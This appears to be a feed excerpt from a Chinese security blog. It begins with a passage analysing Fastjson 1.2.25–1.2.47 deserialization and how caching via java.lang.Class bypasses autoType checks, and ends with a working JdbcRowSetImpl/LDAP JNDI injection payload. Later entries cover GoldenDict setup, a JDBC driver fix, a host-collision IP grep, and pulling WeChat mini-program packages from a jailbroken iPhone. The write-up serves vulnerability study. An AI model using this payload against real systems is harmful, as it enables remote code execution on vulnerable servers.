&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;1225fastjson1247&#34;&gt;1.2.25&amp;lt;=Fastjson&amp;lt;=1.2.47&lt;/h2&gt;
&lt;h5 id=&#34;影响版本&#34;&gt;影响版本&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用&lt;/li&gt;
&lt;li&gt;1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;分析&#34;&gt;分析&lt;/h5&gt;
&lt;p&gt;版本：fastjson1.2.47
问题还是在com.alibaba.fastjson.parser.ParserConfig#checkAutoType，前面的代码还是对&lt;code&gt;[&lt;/code&gt;,&lt;code&gt;L&lt;/code&gt;,&lt;code&gt;;&lt;/code&gt;的过滤，紧接着为是否开启autoTypeSupport
1.2.47校验逻辑&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if (this.autoTypeSupport || expectClass != null) { ##如果开启了autoTyoeSupport
                    long hash = h3;
                    for(int i = 3; i &amp;lt; className.length(); ++i) {
                        hash ^= (long)className.charAt(i);
                        hash *= 1099511628211L;
                        ##先白名单
                        if (Arrays.binarySearch(this.acceptHashCodes, hash) &amp;gt;= 0) {
                            clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
                            if (clazz != null) {
                                return clazz;
                            }
                        }
                        ##再黑名单，如果匹配到黑名单并且缓存中没有这个类的话抛出异常
                        if (Arrays.binarySearch(this.denyHashCodes, hash) &amp;gt;= 0 &amp;amp;&amp;amp; TypeUtils.getClassFromMapping(typeName) == null) {
                            throw new JSONException(&amp;#34;autoType is not support. &amp;#34; + typeName);
                        }
                    }
                }

if (clazz == null) {
    ##在TypeUtils.mappings中寻找缓存的class
    clazz = TypeUtils.getClassFromMapping(typeName);
}
if (clazz == null) {
    ##在deserializers中寻找这个类
    clazz = this.deserializers.findClass(typeName);
}
##如果clazz有了值则返回clazz，如果没有 抛出异常
if (clazz != null) {
    if (expectClass != null &amp;amp;&amp;amp; clazz != HashMap.class &amp;amp;&amp;amp; !expectClass.isAssignableFrom(clazz)) {
        throw new JSONException(&amp;#34;type not match. &amp;#34; + typeName + &amp;#34; -&amp;gt; &amp;#34; + expectClass.getName());
    } else {
        return clazz;
    }
} else {
	  ##autoTypeSupport没开启的情况
    if (!this.autoTypeSupport) {
        long hash = h3;

        for(int i = 3; i &amp;lt; className.length(); ++i) {
            char c = className.charAt(i);
            hash ^= (long)c;
            hash *= 1099511628211L;
            ##先匹配黑名单，如果匹配到直接抛出异常
            if (Arrays.binarySearch(this.denyHashCodes, hash) &amp;gt;= 0) {
                throw new JSONException(&amp;#34;autoType is not support. &amp;#34; + typeName);
            }

            if (Arrays.binarySearch(this.acceptHashCodes, hash) &amp;gt;= 0) {
                if (clazz == null) {
                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
                }

                if (expectClass != null &amp;amp;&amp;amp; expectClass.isAssignableFrom(clazz)) {
                    throw new JSONException(&amp;#34;type not match. &amp;#34; + typeName + &amp;#34; -&amp;gt; &amp;#34; + expectClass.getName());
                }

                return clazz;
            }
        }
    }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;1.2.32校验逻辑
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211160902080.png&#34; alt=&#34;image-20221116090226996&#34;&gt;
这里出现了逻辑问题&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;开启autoTypeSupport时：先匹配白名单，匹配到的话直接return clazz；如果没有匹配到则匹配黑名单，当匹配到黑名单并且mappings中没有这个类的缓存的话才会抛出异常。对比1.2.32的校验逻辑，只要匹配到黑名单就会抛出异常。因此1.2.25-1.2.32版本受autoTypeSupport的影响&lt;/li&gt;
&lt;li&gt;不开启autoTypeSupport时，直接匹配黑名单，匹配到的话抛出异常，后面代码不执行，所以要在判断前下功夫。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;判断没有开启autoTypeSupport前有三个if，怎样在这三步中将恶意类加载进去呢。
deserializers：无法写入值，用不了。
TypeUtils.getClassFromMapping(typeName)：
从TypeUtils.mappings中取值，他是一个ConcurrentMap类型的对象
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211160950806.png&#34; alt=&#34;image-20221116095029750&#34;&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211160953479.png&#34; alt=&#34;image-20221116095306438&#34;&gt;
能向mappings中赋值的方法
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211160957152.png&#34; alt=&#34;image-20221116095709105&#34;&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211160957266.png&#34; alt=&#34;image-20221116095740236&#34;&gt;
其中，addBaseClassMappings()无入参，无法控制；看下loadclass：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public static Class&amp;lt;?&amp;gt; loadClass(String className, ClassLoader classLoader, boolean cache) {
        if (className != null &amp;amp;&amp;amp; className.length() != 0) {
            Class&amp;lt;?&amp;gt; clazz = (Class)mappings.get(className);
            if (clazz != null) {
                return clazz;
            } else if (className.charAt(0) == &amp;#39;[&amp;#39;) {
                Class&amp;lt;?&amp;gt; componentType = loadClass(className.substring(1), classLoader);
                return Array.newInstance(componentType, 0).getClass();
            } else if (className.startsWith(&amp;#34;L&amp;#34;) &amp;amp;&amp;amp; className.endsWith(&amp;#34;;&amp;#34;)) {
                String newClassName = className.substring(1, className.length() - 1);
                return loadClass(newClassName, classLoader);
            ##如果clazz为空
            } else {
                try {
                		##如果classLoader非空并且cache为true时，使用类加载器加载并缓存到mappings中
                    if (classLoader != null) {
                        clazz = classLoader.loadClass(className);
                        if (cache) {
                            mappings.put(className, clazz);
                        }

                        return clazz;
                    }
                } catch (Throwable var7) {
                    var7.printStackTrace();
                }
								##如果失败或者没指定classLoader 并且cache为true的话，使用当前线程的contextClassLoader来加载并缓存到mappings中
                try {
                    ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
                    if (contextClassLoader != null &amp;amp;&amp;amp; contextClassLoader != classLoader) {
                        clazz = contextClassLoader.loadClass(className);
                        if (cache) {
                            mappings.put(className, clazz);
                        }

                        return clazz;
                    }
                } catch (Throwable var6) {
                }
								##如果还是失败的话，反射获取class对象并放入mappings中
                try {
                    clazz = Class.forName(className);
                    mappings.put(className, clazz);
                    return clazz;
                } catch (Throwable var5) {
                    return clazz;
                }
            }
        } else {
            return null;
        }
    }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以只要能控制这三个参数，就可以将任意类写入mappings。loadClass有三个重载方法
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161036742.png&#34; alt=&#34;image-20221116103633697&#34;&gt;
找三个方法在哪里被调用，再看看能否被控制。(下载源码包)
最终定位到com.alibaba.fastjson.serializer.MiscCodec#deserialze.文件内定位loadClass，发现当strVal有值并且clazz为Class.class时才会进入if，然后类加载并缓存到mappings
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161108186.png&#34; alt=&#34;image-20221116110811152&#34;&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161104279.png&#34; alt=&#34;image-20221116110440251&#34;&gt;
strVal值怎么获取的呢，原来是json解析val中的内容，然后向上转型成String
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161111887.png&#34; alt=&#34;image-20221116111130847&#34;&gt;
原来是json解析val中的内容，然后向上转型成String。
这样一条调用链就完整了，但如何进入if (parser.resolveStatus == 2) {}呢、。
构造一条json调试试试&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;String json = &amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.lang.Class\&amp;#34;,&amp;#34; +
              &amp;#34;\&amp;#34;val\&amp;#34;:\&amp;#34;vulClass\&amp;#34;}&amp;#34;;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;调用parse进行json解析
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161141759.png&#34; alt=&#34;image-20221116114102686&#34;&gt;
调用checkAutoType检查autoTypeSupport
deserializers在初始化时会加载Class.class，所以用findClass会找到，然后return clazz。越过了下面的&lt;code&gt;if (!this.autoTypeSupport) {}&lt;/code&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161152942.png&#34; alt=&#34;image-20221116115241919&#34;&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161151984.png&#34; alt=&#34;image-20221116115130950&#34;&gt;
autoTypeSupport检测完后，现在clazz不为空，DedaultHSONParser#parseObject中设置setResolveStatus为2
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161200962.png&#34; alt=&#34;image-20221116120032928&#34;&gt;
根据clazz类型分配deserialzer，Class类型由MiscCodec.deserialze()处理
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161544633.png&#34; alt=&#34;image-20221116154433579&#34;&gt;
进去MiscCodec跟一下，json解析val中的内容并赋值给objVal
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161548340.png&#34; alt=&#34;image-20221116154827313&#34;&gt;
将objVal转化为String类型并赋值给strVal
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161551905.png&#34; alt=&#34;image-20221116155118881&#34;&gt;
判断clazz是否为Class.class，是的话加载strVal这个类并缓存到mappings
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161552130.png&#34; alt=&#34;image-20221116155220106&#34;&gt;
现在恶意类已经被加载到mappings，再次用恶意类进行@type请求时就可以绕过。所以payload
以上为第一个test解析过程;test2解析时很简单了,mappings中有了缓存，直接从缓存中getClass
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161614252.png&#34; alt=&#34;image-20221116161423207&#34;&gt;
然后return clazz -&amp;gt; setResolveStatus(2) -&amp;gt; 根据clazz类型分配deserialzer ......参考之前版本的反序列化流程&lt;/p&gt;
&lt;h5 id=&#34;payload&#34;&gt;payload&lt;/h5&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{
    &amp;#34;test&amp;#34;: {
        &amp;#34;@type&amp;#34;: &amp;#34;java.lang.Class&amp;#34;,
        &amp;#34;val&amp;#34;: &amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;
    },
    &amp;#34;test2&amp;#34;: {
        &amp;#34;@type&amp;#34;: &amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;,
        &amp;#34;dataSourceName&amp;#34;: &amp;#34;ldap://127.0.0.1:1389/VulClass&amp;#34;,
        &amp;#34;autoCommit&amp;#34;: true
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Fastjsn&amp;lt;=1.2.68&lt;/p&gt;
&lt;p&gt;mvn dependency:resolve -Dclassifier=sources&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/fastjson/" term="fastjson" label="fastjson" />
                            
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" term="java反序列化" label="java反序列化" />
                            
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/%E6%BC%8F%E6%B4%9E/" term="漏洞" label="漏洞" />
                            
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/java/" term="java" label="java" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">m1 划词翻译</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/goldendict/" />
            <id>https://klearcc.github.io/post/goldendict/</id>
            <updated>2022-10-20T12:44:25&#43;08:00</updated>
            <published>2022-10-20T10:33:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">Date: Thu Oct 20 10:44:28 CST 2022 前情提要 之前win用星际译……</summary>
            
                <content type="html">&lt;p&gt;Date: Thu Oct 20 10:44:28 CST 2022&lt;/p&gt;
&lt;h3 id=&#34;前情提要&#34;&gt;前情提要&lt;/h3&gt;
&lt;p&gt;之前win用星际译王划词翻译很爽，突发奇想mac装试试。经过尝试，huzheng的包装不了，自己编译用到很多依赖，各种module报错。时间不够强烈建议直接放弃。&lt;/p&gt;
&lt;p&gt;替代品：GoldenDict。
和StarDict高度相似，功能、体验可以说比星际译王还要棒。
功能：屏幕划词翻译，屏幕段落翻译。OCR没弄。&lt;/p&gt;
&lt;h3 id=&#34;效果&#34;&gt;效果&lt;/h3&gt;
&lt;p&gt;cn &amp;gt; en&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210201047960.png&#34; alt=&#34;image-20221020104721898&#34;&gt;
en &amp;gt; cn
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210201048996.png&#34; alt=&#34;image-20221020104848968&#34;&gt;&lt;/p&gt;
&lt;p&gt;段落：&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210201138712.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;goldendict安装使用&#34;&gt;GoldenDict安装&amp;amp;&amp;amp;使用&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;下载mac版&lt;a href=&#34;https://sourceforge.net/projects/goldendict/files/early%20access%20builds/MacOS/GoldenDict-1.5.0-RC2-372-gc3ff15f%28Qt_5121%29.dmg/download&#34;&gt;GoldenDict&lt;/a&gt;；下载&lt;a href=&#34;http://download.huzheng.org/zh_CN/&#34;&gt;词典&lt;/a&gt;，鄙人用的&lt;a href=&#34;http://download.huzheng.org/zh_CN/stardict-langdao-ec-gb-2.4.2.tar.bz2&#34;&gt;朗道英汉&lt;/a&gt;和&lt;a href=&#34;http://download.huzheng.org/zh_CN/stardict-langdao-ce-gb-2.4.2.tar.bz2&#34;&gt;朗道汉英&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;打开GoldenDict，设置中文界面
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210201118702.png&#34; alt=&#34;image-20221020111820664&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;解压字典至任意目录，打开GodneDict &amp;gt; 编辑 &amp;gt; 词典 &amp;gt; 词典来源 &amp;gt; 文件 &amp;gt; 添加 &amp;gt; 两个字典所在文件夹 &amp;gt; Apply &amp;gt; 重新扫描
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210201052546.png&#34; alt=&#34;image-20221020105251523&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;GodneDict &amp;gt; 编辑 &amp;gt; 词典 &amp;gt; 词典
词典上下位置对应翻译窗口内 对应词典翻译 的位置。
词典群组设置可以根据自己喜好设置。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;设置划词翻译，GoldenDict &amp;gt; 偏好设置 &amp;gt; 屏幕取词&lt;/p&gt;
&lt;p&gt;我的设置&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210201101709.png&#34; alt=&#34;image-20221020110140684&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用
鼠标移动到词上，会自动翻译，建议在safari下尝试。某些程序内不能使用屏幕取词，比如google、sublime、idea。
这时候可以用command + C + C。GoldenDict会自动翻译剪切板内的文本。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210201107953.png&#34; alt=&#34;image-20221020110704921&#34;&gt;
另外内置wiki百科的词典，但是挂梯子才可使用：
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210201110981.png&#34; alt=&#34;image-20221020111002945&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;至此，可以日常使用词典翻译了。但不能翻译短语长句。可以使用 google-translate-for-goldendict 解决，使用需要挂梯子。项目地址：https://github.com/xinebf/google-translate-for-goldendict
安装python&amp;gt;3.8，&lt;a href=&#34;www.baidu.com&#34;&gt;如何安装&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;终端运行：
&lt;code&gt;python -m pip install --upgrade pip &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;pip install google-translate-for-goldendict&lt;/code&gt;
测试：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python -m googletranslate.googletranslate zh-CN &amp;quot;dont give up&amp;quot; -p 127.0.0.1:1087 &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;提示：代理只支持http
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210201122916.png&#34; alt=&#34;image-20221020112227876&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210201120646.png&#34; alt=&#34;image-20221020112028619&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开：GodneDict &amp;gt; 编辑 &amp;gt; 词典 &amp;gt; 词典来源 &amp;gt; 程序
坑：命令行中python必须使用绝对路径，否则会报255错。绝对路径查看：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210201129068.png&#34; alt=&#34;image-20221020112959046&#34;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;key&lt;/th&gt;
&lt;th&gt;value&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;已启用&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;类型&lt;/td&gt;
&lt;td&gt;Html&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;名称&lt;/td&gt;
&lt;td&gt;Google Translate&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;命令行&lt;/td&gt;
&lt;td&gt;/Users/baicai/.pyenv/versions/3.9.1/bin/python -m googletranslate.googletranslate zh-CN %GDWORD% -p 127.0.0.1:1087&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;图标&lt;/td&gt;
&lt;td&gt;”随意，别太大“&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;至此结束，效果：&lt;/p&gt;
&lt;p&gt;再提示：鼠标自动取词翻译获取的内容不正确的话，可以使用Command + c + c翻译。
查单词：
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210201135064.png&#34; alt=&#34;image-20221020113513027&#34;&gt;&lt;/p&gt;
&lt;p&gt;查段落：
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210201135429.png&#34; alt=&#34;image-20221020113550398&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/keatonlao/p/12702571.html&#34;&gt;https://www.cnblogs.com/keatonlao/p/12702571.html&lt;/a&gt;
&lt;a href=&#34;https://github.com/xinebf/google-translate-for-goldendict&#34;&gt;https://github.com/xinebf/google-translate-for-goldendict&lt;/a&gt;&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/tips/" term="Tips" label="Tips" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">解决idea报错[java.lang.ClassNotFoundException: com.mysql.jdbc.Driver]</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/jdbcdriver%E6%9C%AA%E6%89%BE%E5%88%B0/" />
            <id>https://klearcc.github.io/post/jdbcdriver%E6%9C%AA%E6%89%BE%E5%88%B0/</id>
            <updated>2022-10-20T10:31:46&#43;08:00</updated>
            <published>2022-10-18T21:22:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">报错 java.lang.ClassNotFoundException: com.mysql.jdbc.Driver 解决 maven等等依赖都添加还是……</summary>
            
                <content type="html">&lt;h3 id=&#34;报错&#34;&gt;报错&lt;/h3&gt;
&lt;p&gt;java.lang.ClassNotFoundException: com.mysql.jdbc.Driver&lt;/p&gt;
&lt;h3 id=&#34;解决&#34;&gt;解决&lt;/h3&gt;
&lt;p&gt;maven等等依赖都添加还是报错：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在项目WEB-INF目录下新建lib文件夹&lt;/li&gt;
&lt;li&gt;将mysql-connector-java-x.xx.xx.jar包复制到lib文件夹下。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;还是不行的话，从文件夹复制文件到lib目录下。我的直接从idea Libraries拖到lib文件夹下不起作用，手动复制jar包后成功解决。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210182250503.png&#34; alt=&#34;image-20221018225048409&#34;&gt;&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/java/" term="java" label="java" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">host碰撞提ip</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/host%E7%A2%B0%E6%92%9E/" />
            <id>https://klearcc.github.io/post/host%E7%A2%B0%E6%92%9E/</id>
            <updated>2022-10-13T23:37:35&#43;08:00</updated>
            <published>2022-10-13T21:16:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">提取相关ip cat ./* |grep -E &amp;#39;^&amp;lt;a href=&amp;#34;/&amp;#39;|grep -vE &amp;#39;ipchaxun.com&amp;lt;/a&amp;gt;$|&amp;#34;&amp;gt;&amp;lt;/a&amp;gt;$&amp;#39;|awk -F &amp;#39;/&amp;#39; &amp;#39;{print$2}&amp;#39;|sort|uniq</summary>
            
                <content type="html">&lt;p&gt;提取相关ip&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cat ./* |grep -E &amp;#39;^&amp;lt;a href=&amp;#34;/&amp;#39;|grep -vE &amp;#39;ipchaxun.com&amp;lt;/a&amp;gt;$|&amp;#34;&amp;gt;&amp;lt;/a&amp;gt;$&amp;#39;|awk -F &amp;#39;/&amp;#39; &amp;#39;{print$2}&amp;#39;|sort|uniq
&lt;/code&gt;&lt;/pre&gt;</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/tips/" term="Tips" label="Tips" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">小程序解包</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/%E5%B0%8F%E7%A8%8B%E5%BA%8F1/" />
            <id>https://klearcc.github.io/post/%E5%B0%8F%E7%A8%8B%E5%BA%8F1/</id>
            <updated>2022-10-13T23:36:05&#43;08:00</updated>
            <published>2022-10-13T20:09:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">获取小程序的.wxapkg文件 书接上文i……</summary>
            
                <content type="html">&lt;h3 id=&#34;获取小程序的wxapkg文件&#34;&gt;获取小程序的.wxapkg文件&lt;/h3&gt;
&lt;p&gt;书接上文&lt;a href=&#34;https://klearcc.github.io/post/%E8%B6%8A%E7%8B%B1/&#34;&gt;iphone6 12.2越狱+ssh&lt;/a&gt;，越狱机已安装Filza、ssh。&lt;/p&gt;
&lt;h4 id=&#34;前情提要&#34;&gt;前情提要&lt;/h4&gt;
&lt;p&gt;​	在微信开发者工具中开发完小程序后，点击“上传”按钮，微信开发者工具会进行“编译”，对 JS 代码进行压缩混淆以及对 &lt;code&gt;wxml&lt;/code&gt;、&lt;code&gt;wxss&lt;/code&gt; 和资源文件等进行整合打包成一个 &lt;code&gt;.wxapkg&lt;/code&gt; 文件上传给微信服务器。所以要“反编译”小程序，首先要获取到小程序对应的 &lt;code&gt;.wxapkg&lt;/code&gt; 包&lt;/p&gt;
&lt;h4 id=&#34;获取wxapkg文件&#34;&gt;获取wxapkg文件&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;打开Filza，找到本地app安装目录:&lt;code&gt;/var/mobile/Containers/Data/Application/&lt;/code&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210132246769.png&#34; alt=&#34;image-20221013224600719&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;找到微信目录，对应(我的是680ExxxxxxxF6199118);在当前目录搜索wxapkg&lt;/p&gt;
&lt;p&gt;可以发现小程序包存放的完整目录为：&lt;code&gt;/var/mobile/Containers/Data/Application/&amp;lt;wechat sandbox&amp;gt;/Library/WechatPrivate/&amp;lt;userid&amp;gt;/WeApp/LocalCache/release/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中&lt;code&gt;wechat sandbox&lt;/code&gt;为上面的id，userid为微信账号id的md5。&lt;/p&gt;
&lt;p&gt;进入后有很多wx...开头的文件夹，其为每个小程序对应的AppId。每个文件夹中都存放着对应小程序的wxapkg包。
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210132246881.png&#34; alt=&#34;image-20221013224618840&#34;&gt;&lt;/p&gt;
&lt;p&gt;Appid获取：&lt;/p&gt;
&lt;p&gt;1、抓包详见&lt;a href=&#34;https://klearcc.github.io/post/iosapp%E6%8A%93%E5%8C%85/&#34;&gt;Appid获取,&lt;/a&gt;，随便找个app抓个包&lt;/p&gt;
&lt;p&gt;2、删掉其他小程序，只留待测的&lt;/p&gt;
&lt;p&gt;3、待测小程序删掉重进，看修改日期&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210132304506.png&#34; alt=&#34;image-20221013230456471&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将wxapkg包cp到本机来&lt;/p&gt;
&lt;p&gt;方法一：ssh&lt;/p&gt;
&lt;p&gt;手打路径很麻烦，可以在Filza设置中启用webdav服务，启用后mac浏览器访问手机11111端口，可以浏览手机目录结构
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202210132235460.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iproxy &lt;span class=&#34;m&#34;&gt;2222&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh root@127.0.0.1 -p &lt;span class=&#34;m&#34;&gt;2222&lt;/span&gt;
